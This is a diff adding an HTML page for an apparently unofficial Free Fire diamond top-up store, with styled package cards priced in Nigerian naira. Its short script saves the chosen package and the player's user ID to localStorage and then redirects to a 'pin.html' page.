@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <meta
+      name="description"
+      content="Top up diamonds for your Free Fire account quickly and securely. Get the best deals on Free Fire diamonds today!"
+    />
+    <meta
+      name="keywords"
+      content="Free Fire, Free Fire diamonds, FF diamond top-up, buy diamonds, Free Fire recharge, Garena Free Fire"
+    />
+    <meta name="author" content="Your Website Name" />
+    <meta
+      property="og:title"
+      content="Free Fire Diamond Top-Up - Fast & Secure"
+    />
+    <meta
+      property="og:description"
+      content="Buy Free Fire diamonds at the best rates. Instant delivery and secure payment."
+    />
+    <meta
+      property="og:image"
+      content="https://www.pngmart.com/files/22/Garena-Free-Fire-Logo-PNG-Pic.png"
+    />
+    <meta property="og:url" content="YourWebsiteURL" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Free Fire Diamond Top-Up" />
+    <meta
+      name="twitter:description"
+      content="Top up Free Fire diamonds instantly with secure payments."
+    />
+    <meta
+      name="twitter:image"
+      content="https://www.pngmart.com/files/22/Garena-Free-Fire-Logo-PNG-Pic.png"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      href="https://www.pngmart.com/files/22/Garena-Free-Fire-Logo-PNG-Pic.png"
+    />
+    <title>Free Fire Diamond Top-Up | Fast & Secure</title>
+    <title>Diamond Purchase</title>
+    <style>
+      /* Modern CSS Reset */
+      *,
+      *::before,
+      *::after {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      /* Custom Properties */
+      :root {
+        --primary-color: #ff6b00;
+        --secondary-color: #a29bfe;
+        --accent-color: #fd79a8;
+        --text-color: #2d3436;
+        --light-color: #f9f9f9;
+        --dark-color: #2d3436;
+        --shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        --border-radius: 12px;
+        --transition: all 0.3s ease;
+      }
+
+      /* Base styles */
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        background: #1a1a1a;
+        color: var(--text-color);
+        line-height: 1.6;
+        min-height: 100vh;
+        padding-bottom: 70px;
+      }
+
+      /* Header */
+      .header {
+        background: linear-gradient(
+          135deg,
+          var(--primary-color) 0%,
+          var(--secondary-color) 100%
+        );
+        padding: 1.5rem;
+        text-align: center;
+        box-shadow: var(--shadow);
+        position: relative;
+        overflow: hidden;
+      }
+
+      .header::before {
+        content: "";
+        position: absolute;
+        top: -50%;
+        left: -50%;
+        width: 200%;
+        height: 200%;
+        background: radial-gradient(
+          rgba(255, 255, 255, 0.1) 5%,
+          transparent 5%
+        );
+        background-size: 20px 20px;
+        transform: rotate(30deg);
+        z-index: 1;
+      }
+
+      .header-content {
+        position: relative;
+        z-index: 2;
+      }
+
+      .header h1 {
+        font-size: 2rem;
+        color: white;
+        margin-bottom: 0.5rem;
+        text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
+      }
+
+      .header p {
+        color: rgba(255, 255, 255, 0.9);
+        font-size: 1rem;
+        max-width: 600px;
+        margin: 0 auto;
+      }
+
+      /* Diamond packages container */
+      .container {
+        max-width: 1200px;
+        margin: 2rem auto;
+        padding: 0 1rem;
+      }
+
+      .section-title {
+        text-align: center;
+        margin-bottom: 2rem;
+        color: var(--primary-color);
+        font-size: 1.8rem;
+        position: relative;
+        padding-bottom: 0.5rem;
+      }
+
+      .section-title::after {
+        content: "";
+        position: absolute;
+        bottom: 0;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 50px;
+        height: 3px;
+        background-color: var(--accent-color);
+        border-radius: 3px;
+      }
+
+      /* Diamond grid */
+      .diamond-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+        gap: 1.5rem;
+      }
+
+      /* Diamond card */
+      .diamond-card {
+        background-color: white;
+        border-radius: var(--border-radius);
+        box-shadow: var(--shadow);
+        overflow: hidden;
+        transition: var(--transition);
+        position: relative;
+      }
+
+      .diamond-card:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
+      }
+
+      .diamond-img {
+        width: 100%;
+        height: 160px;
+        object-fit: cover;
+        border-bottom: 1px solid rgba(0, 0, 0, 0.05);
+      }
+
+      .diamond-badge {
+        position: absolute;
+        top: 10px;
+        right: 10px;
+        background-color: var(--accent-color);
+        color: white;
+        padding: 0.25rem 0.5rem;
+        border-radius: 20px;
+        font-size: 0.75rem;
+        font-weight: bold;
+      }
+
+      .diamond-content {
+        padding: 1.5rem;
+        text-align: center;
+      }
+
+      .diamond-title {
+        font-size: 1.25rem;
+        margin-bottom: 0.5rem;
+        color: var(--primary-color);
+      }
+
+      .diamond-price {
+        font-size: 1.5rem;
+        font-weight: bold;
+        color: var(--accent-color);
+        margin-bottom: 1rem;
+      }
+
+      .diamond-description {
+        font-size: 0.9rem;
+        color: #666;
+        margin-bottom: 1rem;
+      }
+
+      .btn {
+        display: inline-block;
+        background-color: var(--primary-color);
+        color: white;
+        padding: 0.75rem 1.5rem;
+        border-radius: 30px;
+        text-decoration: none;
+        font-weight: bold;
+        transition: var(--transition);
+        border: none;
+        cursor: pointer;
+        outline: none;
+        text-align: center;
+        font-size: 1rem;
+      }
+
+      .btn:hover {
+        background-color: var(--secondary-color);
+        transform: scale(1.05);
+      }
+
+      .btn-block {
+        display: block;
+        width: 100%;
+      }
+
+      /* Bottom sheet */
+      .bottom-sheet {
+        position: fixed;
+        bottom: -100%;
+        left: 0;
+        right: 0;
+        background-color: white;
+        padding: 2rem;
+        border-top-left-radius: 20px;
+        border-top-right-radius: 20px;
+        box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.1);
+        transition: bottom 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        z-index: 1000;
+      }
+
+      .bottom-sheet.active {
+        bottom: 0;
+      }
+
+      .bottom-sheet-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background-color: rgba(0, 0, 0, 0.5);
+        z-index: 999;
+        opacity: 0;
+        visibility: hidden;
+        transition: opacity 0.3s ease;
+      }
+
+      .bottom-sheet-overlay.active {
+        opacity: 1;
+        visibility: visible;
+      }
+
+      .bottom-sheet-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 1.5rem;
+      }
+
+      .bottom-sheet-title {
+        font-size: 1.25rem;
+        color: var(--primary-color);
+      }
+
+      .close-button {
+        background: none;
+        border: none;
+        font-size: 1.5rem;
+        cursor: pointer;
+        color: #666;
+      }
+
+      .form-group {
+        margin-bottom: 1.5rem;
+      }
+
+      .form-label {
+        display: block;
+        margin-bottom: 0.5rem;
+        color: var(--text-color);
+        font-weight: 500;
+      }
+
+      .form-control {
+        width: 100%;
+        padding: 1rem;
+        border: 1px solid #ddd;
+        border-radius: var(--border-radius);
+        font-size: 1rem;
+        transition: var(--transition);
+      }
+
+      .form-control:focus {
+        border-color: var(--primary-color);
+        outline: none;
+        box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.1);
+      }
+
+      .selected-package {
+        display: flex;
+        align-items: center;
+        background-color: rgba(108, 92, 231, 0.1);
+        padding: 1rem;
+        border-radius: var(--border-radius);
+        margin-bottom: 1.5rem;
+      }
+
+      .package-icon {
+        font-size: 1.5rem;
+        margin-right: 1rem;
+        color: var(--primary-color);
+      }
+
+      .package-info {
+        flex-grow: 1;
+      }
+
+      .package-title {
+        font-weight: 500;
+        margin-bottom: 0.25rem;
+      }
+
+      .package-price {
+        color: var(--accent-color);
+        font-weight: bold;
+      }
+
+      /* Responsive adjustments */
+      @media (max-width: 768px) {
+        .header h1 {
+          font-size: 1.75rem;
+        }
+
+        .header p {
+          font-size: 0.9rem;
+        }
+
+        .section-title {
+          font-size: 1.5rem;
+        }
+
+        .diamond-grid {
+          grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+        }
+      }
+
+      @media (max-width: 480px) {
+        .header h1 {
+          font-size: 1.5rem;
+        }
+
+        .header p {
+          font-size: 0.85rem;
+        }
+
+        .section-title {
+          font-size: 1.25rem;
+        }
+
+        .diamond-grid {
+          grid-template-columns: 1fr;
+        }
+
+        .bottom-sheet {
+          padding: 1.5rem;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <!-- Header Section -->
+    <header class="header">
+      <div class="header-content">
+        <h1>Free Fire Diamonds</h1>
+        <p>
+          Elevate your gaming experience with premium diamonds at unbeatable
+          prices
+        </p>
+      </div>
+    </header>
+
+    <!-- Main Content -->
+    <div class="container">
+      <h2 class="section-title">Choose Your Package</h2>
+
+      <div class="diamond-grid">
+        <!-- Diamond Package 1 -->
+        <div class="diamond-card">
+          <img
+            src="https://th.bing.com/th/id/OIP.08nEyQesk-X26IDNj8dywgHaEo?rs=1&pid=ImgDetMain"
+            alt="100 Diamonds"
+            class="diamond-img"
+          />
+          <span class="diamond-badge">Basic</span>
+          <div class="diamond-content">
+            <h3 class="diamond-title">100 Diamonds</h3>
+            <p class="diamond-price">NGN 1,250.00</p>
+            <p class="diamond-description">
+              Perfect for casual players looking to enhance their game.
+            </p>
+            <a
+              href="javascript:void(0);"
+              class="btn btn-block"
+              onclick="showBottomSheet(100, 'Basic Pack', 'NGN 1,250.00')"
+              >Buy Now</a
+            >
+          </div>
+        </div>
+
+        <!-- Diamond Package 2 -->
+        <div class="diamond-card">
+          <img
+            src="https://th.bing.com/th/id/OIP.08nEyQesk-X26IDNj8dywgHaEo?rs=1&pid=ImgDetMain"
+            alt="310 Diamonds"
+            class="diamond-img"
+          />
+          <span class="diamond-badge">Popular</span>
+          <div class="diamond-content">
+            <h3 class="diamond-title">310 Diamonds</h3>
+            <p class="diamond-price">NGN 3,750.00</p>
+            <p class="diamond-description">
+              Best value for dedicated players who want more options.
+            </p>
+            <a
+              href="javascript:void(0);"
+              class="btn btn-block"
+              onclick="showBottomSheet(310, 'Standard Pack', 'NGN 3,750.00')"
+              >Buy Now</a
+            >
+          </div>
+        </div>
+
+        <!-- Diamond Package 3 -->
+        <div class="diamond-card">
+          <img
+            src="https://th.bing.com/th/id/OIP.08nEyQesk-X26IDNj8dywgHaEo?rs=1&pid=ImgDetMain"
+            alt="520 Diamonds"
+            class="diamond-img"
+          />
+          <span class="diamond-badge">Premium</span>
+          <div class="diamond-content">
+            <h3 class="diamond-title">520 Diamonds</h3>
+            <p class="diamond-price">NGN 6,250.00</p>
+            <p class="diamond-description">
+              Unlock premium content and stand out from the crowd.
+            </p>
+            <a
+              href="javascript:void(0);"
+              class="btn btn-block"
+              onclick="showBottomSheet(520, 'Premium Pack', 'NGN 6,250.00')"
+              >Buy Now</a
+            >
+          </div>
+        </div>
+
+        <!-- Diamond Package 4 -->
+        <div class="diamond-card">
+          <img
+            src="https://th.bing.com/th/id/OIP.08nEyQesk-X26IDNj8dywgHaEo?rs=1&pid=ImgDetMain"
+            alt="1060 Diamonds"
+            class="diamond-img"
+          />
+          <span class="diamond-badge">Ultimate</span>
+          <div class="diamond-content">
+            <h3 class="diamond-title">1060 Diamonds</h3>
+            <p class="diamond-price">NGN 12,500.00</p>
+            <p class="diamond-description">
+              For serious gamers who want the ultimate advantage.
+            </p>
+            <a
+              href="javascript:void(0);"
+              class="btn btn-block"
+              onclick="showBottomSheet(1060, 'Ultimate Pack', 'NGN 12,500.00')"
+              >Buy Now</a
+            >
+          </div>
+        </div>
+        <!-- Diamond Package 4 -->
+        <div class="diamond-card">
+          <img
+            src="https://th.bing.com/th/id/OIP.08nEyQesk-X26IDNj8dywgHaEo?rs=1&pid=ImgDetMain"
+            alt="2180 Diamonds"
+            class="diamond-img"
+          />
+          <span class="diamond-badge">Ultimate Plus</span>
+          <div class="diamond-content">
+            <h3 class="diamond-title">2180 Diamonds</h3>
+            <p class="diamond-price">NGN 24,600.00</p>
+            <p class="diamond-description">Astonishing & Breath Taken</p>
+            <a
+              href="javascript:void(0);"
+              class="btn btn-block"
+              onclick="showBottomSheet(2180, 'Ultimate Plus Pack', 'NGN 24,600.00')"
+              >Buy Now</a
+            >
+          </div>
+        </div>
+        <!-- Diamond Package 6 -->
+        <div class="diamond-card">
+          <img
+            src="https://th.bing.com/th/id/OIP.08nEyQesk-X26IDNj8dywgHaEo?rs=1&pid=ImgDetMain"
+            alt="5600 Diamonds"
+            class="diamond-img"
+          />
+          <span class="diamond-badge">Boss</span>
+          <div class="diamond-content">
+            <h3 class="diamond-title">5600 Diamonds</h3>
+            <p class="diamond-price">NGN 60,500.00</p>
+            <p class="diamond-description">Be the Boss, Freefire Gods</p>
+            <a
+              href="javascript:void(0);"
+              class="btn btn-block"
+              onclick="showBottomSheet(5600, 'Boss Pack', 'NGN 60,500.00')"
+              >Buy Now</a
+            >
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Bottom Sheet Overlay -->
+    <div
+      class="bottom-sheet-overlay"
+      id="bottomSheetOverlay"
+      onclick="closeBottomSheet()"
+    ></div>
+
+    <!-- Bottom Sheet -->
+    <div class="bottom-sheet" id="bottomSheet">
+      <div class="bottom-sheet-header">
+        <h3 class="bottom-sheet-title">Complete Your Purchase</h3>
+        <button class="close-button" onclick="closeBottomSheet()">×</button>
+      </div>
+
+      <div class="selected-package" id="selectedPackage">
+        <div class="package-icon">💎</div>
+        <div class="package-info">
+          <div class="package-title" id="packageTitle">100 Diamonds</div>
+          <div class="package-price" id="packagePrice">NGN 1,250.00</div>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label for="userID" class="form-label">Free Fire User ID</label>
+        <input
+          type="text"
+          id="userID"
+          class="form-control"
+          placeholder="Enter your User ID"
+          required
+        />
+      </div>
+
+      <div class="form-group">
+        <label for="nickname" class="form-label">Nickname (Optional)</label>
+        <input
+          type="text"
+          id="nickname"
+          class="form-control"
+          placeholder="Enter your in-game nickname"
+        />
+      </div>
+
+      <button class="btn btn-block" onclick="continueToPinPage()">
+        Continue to Payment
+      </button>
+    </div>
+
+    <script>
+      // Variables to store selected package details
+      let selectedDiamonds = 0;
+      let selectedPackageTitle = "";
+      let selectedPackagePrice = "";
+
+      // Function to show the bottom sheet
+      function showBottomSheet(diamonds, title, price) {
+        // Store the selected diamond amount
+        selectedDiamonds = diamonds;
+        selectedPackageTitle = title + " - " + diamonds + " Diamonds";
+        selectedPackagePrice = price;
+
+        // Update the bottom sheet content
+        document.getElementById("packageTitle").textContent =
+          selectedPackageTitle;
+        document.getElementById("packagePrice").textContent =
+          selectedPackagePrice;
+
+        // Show the overlay and bottom sheet
+        document.getElementById("bottomSheetOverlay").classList.add("active");
+        document.getElementById("bottomSheet").classList.add("active");
+
+        // Store the selected diamond amount
+        localStorage.setItem("selectedDiamonds", diamonds);
+        localStorage.setItem("packageTitle", selectedPackageTitle);
+        localStorage.setItem("packagePrice", selectedPackagePrice);
+      }
+
+      // Function to close the bottom sheet
+      function closeBottomSheet() {
+        document
+          .getElementById("bottomSheetOverlay")
+          .classList.remove("active");
+        document.getElementById("bottomSheet").classList.remove("active");
+      }
+
+      // Function to redirect to the pin.html page after user inputs their UserID
+      function continueToPinPage() {
+        const userID = document.getElementById("userID").value;
+        const nickname = document.getElementById("nickname").value;
+
+        if (userID.trim() === "") {
+          alert("Please enter your Free Fire UserID!");
+          return;
+        }
+
+        // Store the UserID and nickname
+        localStorage.setItem("userID", userID);
+        if (nickname.trim() !== "") {
+          localStorage.setItem("nickname", nickname);
+        }
+
+        window.location.href = "pin.html"; // Redirect to pin page
+      }
+    </script>
+  </body>
+</html>
